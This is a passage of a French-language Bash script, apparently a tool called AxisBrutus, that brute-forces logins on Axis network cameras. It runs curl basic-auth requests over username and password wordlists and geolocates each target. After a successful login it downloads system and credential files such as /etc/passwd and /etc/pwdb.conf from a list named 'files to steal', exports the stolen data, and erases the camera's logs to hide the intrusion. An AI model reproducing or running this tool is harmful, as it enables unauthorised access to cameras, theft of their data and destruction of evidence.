		if [ "$valeur" = "--maxtime" ] || [ "$valeur" = "-m" ];then
			curl_maxtime=${args[$(($no_arg+1))]}
			if [ $curl_maxtime -lt $min_timeout ];then
				curl_maxtime=$min_timeout
			fi
		fi
		if [ "$valeur" = "--ping-timeout" ];then
			ping_timeout=${args[$(($no_arg+1))]}
			if [ $ping_timeout -lt $min_timeout ];then
				ping_timeout=$min_timeout
			fi
		fi
		#check
		if [ "$valeur" = "--check" ] || [ "$valeur" = "-k" ]; then
			skipModeleDetect='NON'
			checkOnly='OUI'
			skipGeo='OUI'
		fi
		#History break
		if [ "$valeur" = "--hist-break" ] || [ "$valeur" = "--history-break" ]; then
			skipIfInHistory='OUI'
		fi
	fi
done

# si parametre check est passé en meme temps que skip (illogique)
#on impose le check dans ces cas là
if [ "$checkOnly" = "OUI" ];then
	skipModeleDetect='NON'
fi

#Si aucun cible n'est precisée : on quite en affichant un message d'erreur
if [ ${#ip} -eq 0 ];then
	echo -e "$vocab_error!"
	echo -e " $err_no_cible '--cible $vocab_or -c'.\n$vocab_example: $0 --cible 127.45.63.89"
	echo -e " $err_msg_aff_aide '--help' $vocab_or '-h'."
	exit
fi

####################################################################################################################
#                                               VERFIFICATIONS FICHIERS
####################################################################################################################
liste_fichiers_a_verifier=( "$users_wordlist" "$mdp_wordlist" )

for fichier in ${liste_fichiers_a_verifier[*]}; do
	test_fichier=$(fichierExiste $fichier)
	if [ "$test_fichier" != 'OUI' ];then
		echo -e "$col_erreur>$vocab_error: $err_fichier_introuvable :\n$col_script$italic$fichier"
		exit
	fi
done

#verifier si les entetes du fichier log existent deja ou pas
#echo -e "hey:"$(logEnteteCheck)
logEnteteCheck

#On calcul le nombre de probabilités si les fichiers  existent
nb_mdp=$(cat $mdp_wordlist|wc -l)
nb_users=$(cat $users_wordlist|wc -l)
nb_combinaisons=$(($nb_users*$nb_mdp))


####################################################################################################################
#                                                        START
####################################################################################################################
clear

if [ "$checkOnly" != "OUI" ];then
	logMessage ""${logs_msg_start//"__NBCOMBINAISONS__"/$nb_combinaisons}"" "$logs_type_info" # 
else
	logMessage ""$logs_msg_verif"" "$logs_type_info"
fi

#banniere
echo -en $col_logo
echo -en $banniere|base64 -d


#Version
texte_ver="$vocab_version $ab_ver $puce_banner"
espaces=$(ajouterEspacesSlogans "$texte_ver")
echo -e $col_texte_version$espaces$texte_ver

#slogan
#texte_slogan="$ab_slogan$ab_ver"' Version '
#espaces=$(ajouterEspacesSlogans "$texte_slogan")
#echo -e $col_logo' Version '$ab_ver$espaces$ab_slogan


#slogan V2
texte_slogan="$ab_slogan $puce_banner"
espaces=$(ajouterEspacesSlogans "$texte_slogan")
echo -e $col_texte_slogan$espaces$texte_slogan

#auteur
texte_auteur="$vocab_by $ab_auteur $puce_banner"
espaces=$(ajouterEspacesSlogans "$texte_auteur")
echo -en $col_texte_auteur
echo -e $espaces$texte_auteur

#mail
texte_mail="$ab_contact $puce_banner"
espaces=$(ajouterEspacesSlogans "$texte_mail")
echo -en $col_texte_mail
echo -e $espaces$texte_mail

#wab
texte_web="$ab_web $puce_banner"
espaces=$(ajouterEspacesSlogans "$texte_web")
echo -en $col_texte_web
echo -e $espaces$texte_web


####################################################################################################################
#                                            VERFIFICATIONS DES DEPENDENCES
####################################################################################################################

echo -e "$col_section\n$souligne$section_dependences:"$reset


echo -e "$col_titre$puce_level_1$element_commandes : $col_texte"
#curl
ping_existe=$(command -v ping)
curl_existe=$(command -v curl)
if [ ${#ping_existe} -gt 0 ];then
	ping_existe="OUI"
	echo -e "$col_titre$puce_level_2$element_commandes_ping :$col_succes $vocab_ok"
else
	ping_existe="NON"
	echo -e "$col_titre$puce_level_2$element_commandes_ping :$col_erreur $vocab_ko"
	echo -e "$col_titre | $puce_level_2$vocab_solution :$col_texte apt install net-tools"
fi
if [ ${#curl_existe} -gt 0 ];then
	curl_existe="OUI"
	echo -e "$col_titre$puce_level_2$element_commandes_curl :$col_succes $vocab_ok"
else
	curl_existe="NON"
	echo -e "$col_titre$puce_level_2$element_commandes_curl :$col_erreur $vocab_ko"
	echo -e "$col_titre | $puce_level_2$vocab_solution :$col_texte apt install curl"
fi

if [ "$ping_existe" != "OUI" ] || [ "$curl_existe" != "OUI" ] ;then
	echo -e "$col_titre$puce_level_2$vocab_error :$col_erreur $err_dependences"
	echo -e "$col_titre$puce_level_2$vocab_error :$col_erreur $err_quit"
	exit
fi
####################################################################################################################
#                                                     LISTE PARAMETRES
####################################################################################################################


echo -e "$col_section\n$souligne$section_parametres:$reset"

echo -e "$col_titre$puce_level_1$element_param : $col_texte$ip"
if [ "$checkOnly" != "OUI" ];then
	echo -e "$col_titre$puce_level_1$element_param_dicos:"
	echo -e "$col_titre$puce_level_2$element_param_dicos_list_mdp:$col_texte $mdp_wordlist $col_remarque($col_succes$nb_mdp$col_remarque)"
	echo -e "$col_titre$puce_level_2$element_param_dicos_list_users:$col_texte $users_wordlist $col_remarque($col_succes$nb_users$col_remarque)"
	echo -e "$col_titre$puce_level_2$element_param_dicos_nb_combinaisons:$col_succes $nb_combinaisons"
fi

if [ "$skipModeleDetect" = "OUI" ];then
	echo -e "$col_titre$puce_level_1$element_param_modele_detect:$col_texte $vocab_disabled"
fi

if [ $ping_timeout -ne $ping_timeout_default ];then
	echo -e "$col_titre$puce_level_1$element_param_ping_timeout:$col_texte $ping_timeout"
fi

if [ "$noPing" = "OUI" ];then
	echo -e "$col_titre$puce_level_1$element_param_test_co:$col_texte $element_param_ping_timeout_value"
fi

if [ "$checkOnly" = "OUI" ];then
	echo -e "$col_titre$puce_level_1$element_param_attack_only:$col_texte $element_param_attack_only_value"
fi

if [ "$urlforced" = "OUI" ];then
	echo -e "$col_titre$puce_level_1$element_param_uri_forced:$col_texte $targeturi"
fi

if [ "$skipGeo" = "OUI" ];then
	echo -e "$col_titre$puce_level_1$element_param_geolocalisation:$col_texte $vocab_disabled"
fi

if [ "$fichier_logs" != "$fichier_logs_defaut" ];then
	echo -e "$col_titre$puce_level_1$element_param_fic_logs:$col_texte $fichier_logs"
fi

if [ $curl_timeout -ne $curl_timeout_default ] || [ $curl_maxtime -ne $curl_maxtime_default ];then
	echo -e "$col_titre$puce_level_1$element_param_ttl: $col_texte curl timeout=$curl_timeout, curl maxtime=$curl_maxtime"
fi

if [ "$checkOnly" != "OUI" ];then
	logMessage "$logs_fic_usernames: $users_wordlist" "$logs_type_info" 
	logMessage "$logs_fic_mdp: $mdp_wordlist" "$logs_type_info" 
fi
####################################################################################################################
#                                                 TEST DE CONNECTIVITE
####################################################################################################################

deja_attaquee=$(checkHistory)
deja_on=$(echo $deja_attaquee|cut -d " " -f 2)
deja_at=$(echo $deja_attaquee|cut -d " " -f 3)
deja_status=$(echo $deja_attaquee|cut -d " " -f 4)

if [ ${#deja_status} -eq 0 ];then
	deja_status='inconnu'
fi

echo -e "$col_section\n$souligne$section_testConnectivite:$reset"

if [ "$deja_attaquee" != "FALSE" ];then
	echo -e "$col_titre$puce_level_1$element_history_testip:$col_texte $element_history_testip_deja: $vocab_date_on $deja_on $vocab_time_at $deja_at [Etat: $deja_status]"
	if [ "$skipIfInHistory" = "OUI" ];then
		echo -e "$col_titre$puce_level_2 Annulation:$col_texte $element_history_testip_deja_quitter"
		exit
	else
		echo -n "$ip "$(/bin/date '+%d/%m/%y %T') >> $fichier_hist_defaut
	fi
	
else
	echo -e "$col_titre$puce_level_1$element_history_testip:$col_texte $element_history_testip_new"
	echo -n "$ip "$(/bin/date '+%d/%m/%y %T') >> $fichier_hist_defaut
fi

if [ "$noPing" != "OUI" ];then
	echo -e "$col_titre$puce_level_1$element_testco :$col_texte ping $ip_only..."
	test_connectivite=$(checkConnectiviteCible)
	if [ "$test_connectivite" = "SUCCES" ];then
		echo -e "$col_titre$puce_level_2$vocab_results :$col_succes $vocab_ok"
	else
		logMessage "$element_testco_noresponse" "$logs_type_error"
		echo -e "$col_titre$puce_level_2$vocab_results :$col_erreur $vocab_echec"
		if [ "$noPing" != "OUI" ];then
			echo -e "$col_titre$puce_level_2$err_ping :$col_erreur $err_exit"
			exit
		else
			echo -e "$col_titre$puce_level_2$element_testco_ignore_skip:$col_erreur $element_testco_ignore_skip_value"
			logMessage "$logs_testco_ignore" "$logs_type_error"
			
		fi
	fi
else
	echo -e "$col_titre$puce_level_1$element_testco_ignore :$col_texte $vocab_parameter --ignore"
fi
####################################################################################################################
#                                                       ANALYSE
####################################################################################################################
echo -e "$col_section\n$souligne$section_analyse:$reset"

#Informations sur la cibles
echo -en "$col_titre$puce_level_1$element_analyse_mod_tested :$col_texte"
echo -e "$col_texte"${#liste_modeles_verifies[*]}"$col_texte $vocab_intotal. $col_remarque($element_analyse_mod_detect_listhelp)"


#detection du modele  && [ "$checkOnly" != "OUI" ] 
if [ "$skipModeleDetect" = "OUI" ];then
	echo -e "$col_titre$puce_level_1$element_analyse_mod_test_igonre $col_texte"
	logMessage "$element_analyse_mod_detect : $vocab_disabled" "$logs_type_warning" 
	modele_complet=$modele_nondetecte
else
	echo -e "$col_titre$puce_level_1$element_analyse_mod_detect :"
	logMessage "$element_analyse_mod_detect" "$logs_type_info" 
	#modele=$(modeleExtract $modele_complet) # resultats erronés : diag a faire
	echo -e "$col_titre$puce_level_2$vocab_connection : $col_texte$vocab_running"
	x_modele_complet=$(fullModeleDetect $ip)
	modele=$(echo $x_modele_complet|sed "s/.*[aA][xX][iI][sS]/axis/g" | cut -d " " -f 2)
	modele=${modele/.*[aA][xX][iI][sS]/axis}
	tput cuu1;tput el
	echo -e "$col_titre$puce_level_2$vocab_connection : $col_texte$vocab_finished"
	#echo -e $magenta$x_modele_complet
	if [ "$modele_complet" != "$modele_nondetecte" ]; then
		no_modele_recherche=0
		for mod in ${liste_modeles_verifies[*]}; do
			no_modele_recherche=$(( $no_modele_recherche+1 ))
			echox "$col_titre$puce_level_2$element_analyse_mod_detect_running: "$(afficherBarre $no_modele_recherche ${#liste_modeles_verifies[*]} )""
			if [ "$mod" = "$modele" ];then
				modeles_verifie="OUI"
				break
			fi
		done
		echox "$col_titre$puce_level_2$element_analyse_mod_detect_running:$col_texte $vocab_finished"
		

		if [ "$modeles_verifie" = "OUI" ];then
			echo -e "$col_titre$puce_level_2$vocab_model:$col_texte $modele $col_remarque(""$col_succes""$element_analyse_mod_detect_tested$col_remarque) $col_section$smiley_smile"
		else
			echo -e "$col_titre$puce_level_2$vocab_model:$col_texte $modele $col_remarque(""$col_erreur""$element_analyse_mod_detect__nontested$col_remarque) $col_section$smiley_interrogation"
		fi
	else
		echo -e "$magenta $err_modele_inconnu $col_section$smiley_sad"
	fi

	echo -en "$col_titre$puce_level_2"$element_analyse_mod_detect_firmware" :$col_texte"
	#version=$(versionDetect $modele_complet) #pb resultats erronés
	version=$(echo $modele_complet|rev|cut -d " " -f 1|rev)
	if [ "$version" != "N/A" ]; then
		version=$(echo $modele_complet|egrep -o [0-9.,].*)
	fi
	echo -e "$col_texte $vocab_finished"

fi

#recherche url a attaquer
echo -en "$col_titre$puce_level_1$element_analyse_url_search...$col_texte"
if [ "$urlforced" != "OUI" ]; then 
	url=$(urlModele $ip $modele)
	if [ "$checkOnly" != "OUI" ];then
		logMessage "$element_analyse_url_search" "$logs_type_info" 
	fi
fi
echo -e "$col_texte $vocab_finished!"


#La geolocalisation
if [ "$skipGeo" != "OUI" ];then
	echo -en "$col_titre$puce_level_1"$element_analyse_geolocate" : $col_texte"
	infosGeo_save=$(infosGeolocalisation $ip)
	infosGeo=$infosGeo_save
	infosGeoExport=$infosGeo_save
	if [ "$checkOnly" != "OUI" ];then
		logMessage "$element_analyse_geolocate" "$logs_type_info" 
	fi
	echo -e "$col_texte $vocab_finished"
else
	if [ "$checkOnly" != "OUI" ];then
		logMessage "$element_analyse_geolocate" "$logs_type_info" 
	fi
fi
if [ "$checkOnly" != "OUI" ];then

	#prepas vars env et mise en forme 
	echo -en "$col_titre$puce_level_1"$element_prep_env:$col_texte": "

	infosGeo=${infosGeo//':'/":$col_texte"}
	infosGeo=${infosGeo//','/"\n$col_titre$puce_level_2 "}
	echo -e "$col_texte $vocab_finished"
fi

####################################################################################################################
#                                                       INFORMATIONS
####################################################################################################################
echo -e "$col_section\n$souligne$section_informations:$reset"

echo -e "$col_titre$puce_level_1""IP:$col_texte $ip"
echo -en "$col_titre$puce_level_1$vocab_model:$col_texte $modele"
if [ ${#version} -gt 0 ]; then 
	echo -en "$col_texte ($element_info_firmware $magenta$version$col_texte)"
else
	echo -en "$col_texte "
fi


if [ "$checkOnly" = "OUI" ];then
	logMessage "$vocab_model: $modele" "$logs_type_info" 
	logMessage "$vocab_firmware: $version" "$logs_type_info" 
fi

if [ "$modeles_verifie" = "OUI" ]; then 
	echo -e $col_texte" $col_remarque($col_succes$vocab_model $vocab_known$col_remarque)"
	logMessage "$logs_modele_compatible_ok" "$logs_type_info" 
else
	echo -e $col_remarque"($col_erreur$vocab_model $vocab_unknown$col_remarque)"
	logMessage "$logs_modele_compatible_echec" "$logs_type_warning" 
fi

echo -e "$col_titre$puce_level_1$element_info_url_cible:$col_texte $url"


if [ "$checkOnly" != "OUI" ];then
	#export...
	ip4file=${ip/:/-PORT_}
	fichier_mdp_trouve=${fichier_mdp_trouve/~MODELE~/$modele}
	fichier_mdp_trouve=${fichier_mdp_trouve/~IP~/$ip4file}
	if [ "$fichier_mdp_trouve" != "$fichier_mdp_trouve_default" ];then
		echo -e "$col_titre$puce_level_1$element_info_fic_export:$col_texte $fichier_mdp_trouve $col_titre"
	fi
fi

if [ "$skipGeo" != "OUI" ];then
	if [ ${#infosGeo} -eq 0 ]; then 
		infosGeo="$element_info_geo_nothing $smiley_sad"
	fi
	echo -e "$col_titre$puce_level_1$element_param_geolocalisation :"
	echo -en "$col_titre$puce_level_2"$infosGeo""
fi
echo -e "$col_titre"



####################################################################################################################
#                                                TRAITEMENT/ATTAQUE
####################################################################################################################

if [ "$checkOnly" != "OUI" ];then

	echo -e "$col_section\n$souligne$section_attack:$reset"
	logMessage "Attaque en cours" "$logs_type_info"

	progression_pourcent=0
	while read user; do 
		while read mdp; do 
			requete_temps_A=$(/bin/date +%s)
			#avancement:
			total_fait=$(($total_fait+1))		
			total_fait_txt=$(addZeros $nb_combinaisons $total_fait)
			progression_pourcent=$(($total_fait*100/$nb_combinaisons))
			progression_pourcent_txt=$(addZeros 100 $progression_pourcent)		
			
			#debug mode: if [ $total_fait -gt 15 ]; then exit; fi

			
			#avancement:
			ligne_a_afficher="$col_titre[$bleu_fonce$ip$col_titre] [$magenta$total_fait_txt$col_titre/$magenta_fonce$nb_combinaisons$col_titre] [$col_script$progression_pourcent_txt%$col_titre] $user $col_section&$col_titre $mdp : "
			#echo -en "$ligne_a_afficher"
			echo -en "$col_titre$puce_level_1$element_attack $col_section$col_titre$ip: "$(afficherBarre "$total_fait" "$nb_combinaisons")"$col_titre [$col_texte$user$col_titre:$col_texte$mdp$col_titre] "
			
			#Requete HTTP
			/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime -k -s "$url" --user "$user:$mdp"  -o $tmp	
			
			#pour debug rapide: if [ $total_fait -gt 5 ];then exit; fi
			
			#analyse de la reponse
			test_unauthorized=$(cat $tmp |grep --binary-files=text -i $echec)
			#echo "@test_unauthorized@=$test_unauthorized"
			test_javascript=$(cat $tmp |egrep --binary-files=text -i 'enable JavaScript')
			#echo "@test_javascript@=$test_javascript"
			test_administration=$(cat $tmp |egrep --binary-files=text -i 'administration tools')
			#echo "@test_administration@=$test_administration"
			test_configuration=$(cat $tmp |egrep --binary-files=text -i 'Basic Configuration')
			#echo "@test_configuration@=$test_configuration"
			test_page400=$(cat $tmp |egrep --binary-files=text -i '<TITLE>400 ')
			test_page404=$(cat $tmp |egrep --binary-files=text -i '<TITLE>404 ')
			test_page500=$(cat $tmp |egrep --binary-files=text -i '<TITLE>500 ')
			#echo "@test_page404@=$test_page404"
			test_presence_lien_admin=$(cat $tmp |egrep --binary-files=text -i '/admin/users.shtml') #utile dans les cas javascript
			#echo "@test_presence_lien_admin@=$test_presence_lien_admin"

			#si le titre contien "unhotorized"
			if [ ${#test_unauthorized} -gt 0 ];then
				echo -e $col_erreur$msg_echec
			else			
			#sinon on a "administration" dans le titre de la page alors on considere qu'on a passé la porte :D
				if [ ${#test_administration} -gt 0 ] || [ ${#test_configuration} -gt 0 ];then
					echo -e $col_succes$msg_succes
					mdp_trouve='OUI'
					break
				else					
					#si pas de titre administration mais la page contient "enable javascript"
					if [ ${#test_javascript} -gt 0 ];then					
						if [ ${#test_presence_lien_admin} -gt 0 ];then
							echo -e $col_succes$msg_succes
							mdp_trouve='OUI'
							break
						else
							echo -e "$col_erreur$msg_echec: $err_javascript_required"
							echec_js="OUI"
							#echo -e $bleu;cat $tmp;echo -e $reset
							#break
						fi
					#si pas la page admiistration et pas de message JS
						
					else
						#si page 404
						if [ ${#test_page400} -gt 0 ] || [ ${#test_page404} -gt 0 ] || [ ${#test_page500} -gt 0 ];then
														
							echo -e "$col_erreur$msg_echec: $err_javascript_url_notfound $col_section$smiley_interrogation"
							echec_404="OUI"
							break
						#sinon ok?
						else				
							echo -e $col_succes$msg_succes
							mdp_trouve="OUI"
							break
						fi
						
					fi

				fi
			fi
			
			#si ce n'est pas verbose: effecer la ligne precedente avant d'afficher la suivante
			if [ "$modeVerbose" != 'OUI' ];then
				tput cuu1;tput el
				tput cuu1;tput el
			fi

			requete_temps_B=$(/bin/date +%s)
			top_timer=$(( $(/bin/date +%s) -$heure_depart))
		done < $mdp_wordlist

		#on check si on a trouvé un mdp afin de ne pas tester plus de usernames
		if [ "$mdp_trouve" = "OUI" ] ; then
			break
		fi
		#if [ "$echec_js" = "OUI" ]; then
		#	break
		#fi
		if [ "$echec_404" = "OUI" ]; then
			break
		fi
	done < $users_wordlist
fi

heure_fin=$(/bin/date +%s)
heure_duree_totale=$(($heure_fin-$heure_depart-3600))
duree_totale=$(/bin/date -d @$heure_duree_totale +%H:%M:%S)
####################################################################################################################
#                                    			BRAVO OU PAS ?
####################################################################################################################

if [ "$checkOnly" != "OUI" ] ; then
	if [ "$mdp_trouve" = "OUI" ] ; then
		message_fin="$element_attack_finished_succes"
		#Le mot-de-passe a été trouvé en "$top_timer"s après $total_fait tentatives. 
		message_fin=${message_fin//"__TOTALTIME__"/"$top_timer"}
		message_fin=${message_fin//"__TOTALCOMBI__"/"$total_fait"}
		#echo -e "$col_titre$puce_level_2""Succes: $col_texte$message_fin"
		tput cuu1;tput el;echo -e "$col_titre$puce_level_1$element_attack $ip:$col_succes $vocab_succes$col_texte $message_fin"
		echo -e "$col_titre$puce_level_2$vocab_login: $user"
		echo -e "$col_titre$puce_level_2$vocab_password: $mdp"
		echo -e $col_succes
		echo -e $banniere_bravo|base64 -d
		echo -e $ab_slogan_bravo
		echo -e $reset
		logMessage "$message_fin" "$logs_type_pawned"
	else
		message_fin="$element_attack_finished_echec" 
		message_fin=${message_fin//"__TOTALTIME__"/"$top_timer"}
		message_fin=${message_fin//"__TOTALCOMBI__"/"$total_fait"}
		echo -e "$col_titre$puce_level_1$element_attack $ip: $col_texte$message_fin"
		echo -e $col_erreur
		echo -e $banniere_tryagain|base64 -d
		echo -e $ab_slogan_defaite
		echo -e $reset
		logMessage "$message_fin" "$logs_type_notpawned"
	fi
fi
####################################################################################################################
#                                    SYNTHESE DES DONNEES RECUPEREES POUR l'EXPORT
####################################################################################################################

if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$col_section\n$souligne$section_synthese:$reset"
	echo -en "$col_titre$puce_level_1$vocab_running..."
	
	export_donnes="$export_title_creds:"
	export_donnes=$export_donnes"\n - $vocab_login: $user"
	export_donnes=$export_donnes"\n - $vocab_password: $mdp"

	export_donnes=$export_donnes"\n\n$export_title_cam:"
	if [ "$exportforced" = "OUI" ];then
		export_destination="$fichier_mdp_trouve"
	else
		echo $(mkdir "$dossier_mdps" 2>&1) 1>/dev/null
		export_destination="$dossier_mdps/$fichier_mdp_trouve"
	fi

	export_donnes=$export_donnes"\n - IP: $ip"
	export_donnes=$export_donnes"\n - $vocab_model: $modele"

	if [ ${#version} -gt 0 ]; then 
		export_donnes=$export_donnes" ($element_info_firmware $version)"
	else
		export_donnes=$export_donnes""
	fi
	if [ "$modeles_verifie" = "OUI" ]; then 
		export_donnes=$export_donnes" ($vocab_model:$vocab_known)"
	else
		export_donnes=$export_donnes" ($vocab_model:$vocab_unknown)"
	fi

	export_donnes=$export_donnes"\n - $element_info_url_cible: $url"
	if [ "$skipGeo" != "OUI" ];then
		if [ ${#infosGeoExport} -eq 0 ]; then infosGeoExport="$element_info_geo_nothing" ;fi
		export_donnes=$export_donnes"\n - $element_param_geolocalisation :\n\t- "
		#infosGeo=${infosGeoExport//':'/":"}
		export_donnes=$export_donnes" "${infosGeoExport//','/"\n\t- "}""
	fi

	export_donnes=$export_donnes"\n\n$export_title_attack:"
	export_donnes=$export_donnes"\n - $vocab_date: "$(/bin/date "+%c")
	export_donnes=$export_donnes"\n - $element_resume_duration: "$duree_totale
	export_donnes=$export_donnes"\n - $export_start: "$(/bin/date -d @$heure_depart )
	export_donnes=$export_donnes"\n - $export_nbtry: $total_fait $export_total $nb_combinaisons"
	export_donnes=$export_donnes"\n - $export_end: "$(/bin/date -d @$heure_fin )
	export_donnes=$export_donnes"\n - $logs_fic_usernames: "$users_wordlist" ($nb_users $vocab_login""s)"
	export_donnes=$export_donnes"\n - $logs_fic_mdp: "$mdp_wordlist" ($nb_mdp $vocab_password""s)"
	if [ "$skipModeleDetect" = 'OUI' ];then
		export_donnes=$export_donnes"\n - $export_detection_ignored"
	fi
	if [ "$skipGeo" = 'OUI' ];then
		export_donnes=$export_donnes"\n - $export_geo_ignored"
	fi

	echo -e "$col_texte $vocab_finished"
fi

####################################################################################################################
#                                             TELECHARGEMENT DE FICHIERS
####################################################################################################################

if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$col_section\n$souligne$section_telechargement:\n$reset"
	fichiers_a_voler=('/etc/passwd' '/etc/group' '/etc/applications/config_cam1' '/etc/network/network.conf' '/etc/resolv.conf' '/etc/sftpd.banner' '/var/log/messages' '/var/log/messages.old' '/etc/sysconfig/id.conf' '/etc/sysconfig/appwiz.conf' '/etc/sysconfig/systime.conf' '/etc/sysconfig/isp.conf' '/etc/sysconfig/brand.conf' '/etc/sysconfig/smtp.conf' '/etc/sysconfig/image.conf' '/etc/sysconfig/dst.conf' '/etc/sysconfig/layout.conf' '/etc/httpd/conf/boa.conf' '/etc/pwdb.conf' )
	nb_fichiers_a_voler=${#fichiers_a_voler[@]}
	no_fichier=0

	export_donnes=$export_donnes'\n\n:'$vocab_files
	logMessage "$logs_dl_fic" "$logs_type_info" 
	for fichier_x in ${fichiers_a_voler[*]}; do
		no_fichier=$(( $no_fichier+1 ))
		#logMessage "Telechargement : $fichier_x" "INFORMATION" 
			
		if [ "$modeVerbose" != 'OUI' ];then
			tput cuu1;tput el
		fi
		
		#affichage a l'ecran
		echo -e "$col_titre$puce_level_1$vocab_files: "$(afficherBarre "$no_fichier" "$nb_fichiers_a_voler")"$col_titre [$col_texte$fichier_x$col_titre]"
		voleFichier $ip $fichier_x > $temp_vole
		if [ "$modeVerbose" = 'OUI' ]; then
			echo -e "$col_succes$separateur_fichiers$italic$col_script"
			cat $temp_vole
			echo -e "$col_succes$separateur_fichiers$reset"
		fi
		#export
		export_donnes=$export_donnes"\n$fichier_x:"
		export_donnes=$export_donnes"\n$separateur_fichiers"
		while read ligne_fic; do
			export_donnes=$export_donnes"\n"$ligne_fic""
		done < $temp_vole
		export_donnes=$export_donnes"\n$separateur_fichiers\n\n"

	done;

	tput cuu1;tput el
	echo -e "$col_titre$puce_level_1$element_dl_finished:$col_texte $vocab_finished"
		

	echo -e "$reset"
fi

####################################################################################################################
#                                            EXPORT DES DONNES
####################################################################################################################
if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$col_section\n$souligne$section_savegarde:$reset"
	logMessage "$element_exporting : $export_destination" "$logs_type_info"
	echo -en "$col_titre$puce_level_1$vocab_running..."

	echo -e $banniere_export|base64 -d > $export_destination
	echo -e " $ab_web\t \t AxisBrutus Ver. $ab_ver" >> $export_destination
	echo -e "$separateur_logs" >> $export_destination
	echo -e "\n$export_donnes" >> $export_destination
	echo -e "$separateur_logs" >> $export_destination
	echo -e " $ab_auteur  -  $ab_contact  -  $ab_web" >> $export_destination
	echo -e "$col_texte $vocab_finished!"
fi
####################################################################################################################
#                                                      RESUME
####################################################################################################################
if [ "$checkOnly" != "OUI" ]; then
	echo -e "$col_section\n$souligne$section_resume:$reset"
	if [ "$mdp_trouve" = "OUI" ]; then
		echo -e "$col_titre$puce_level_1$element_resume_bravo:$col_texte "${element_resume_succes//"__TOTALCOMBI__"/"$col_succes$total_fait$col_texte"}
		#On l'a trouvé en $col_succes$total_fait$col_texte essais!
		echo -e "$col_titre$puce_level_1$element_resume_echec:$col_texte $element_resume_export : $col_succes$export_destination"
		echo -e " $logs_type_pawned" >>$fichier_hist_defaut
	else
			if [ "$echec_js" = "OUI" ]; then		
				echo -e "$col_titre$puce_level_1$element_resume_fail:$col_texte $err_javascript_resume. $col_section$smiley_sad"
				echo -e "$col_titre$puce_level_1$element_resume_info:$col_texte $err_javascript_info $col_section$smiley_smile"
			else
				echo -e "$col_titre$puce_level_1$element_resume_fail:$col_texte $total_fait $err_tries_without_succes $col_section$smiley_sad"
				echo -e "$col_titre$puce_level_1$element_resume_astuce:$col_texte $msg_astuce_noresult $col_section $smiley_smart"
			fi
		echo -e " $logs_type_notpawned" >>$fichier_hist_defaut
	fi
	echo -e "$col_titre$puce_level_1$element_resume_duration:$col_texte $duree_totale"
fi


####################################################################################################################
#                                              EFFACER LES TRACES/LOGS
####################################################################################################################

if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$col_section\n$souligne$section_eraseLogs:$reset"
	logMessage "$logs_eraselogs" "$logs_type_info"
	echo -en "$col_titre$puce_level_1$vocab_running..."
	#effacer les traces 
	effacerTraces $ip 

	echo -e "$col_texte $vocab_finished"
fi
####################################################################################################################
#                                                        END
####################################################################################################################

logMessage "$vocab_finished : $element_resume_duration $duree_totale" "$logs_type_info"

echo -e $reset
exit
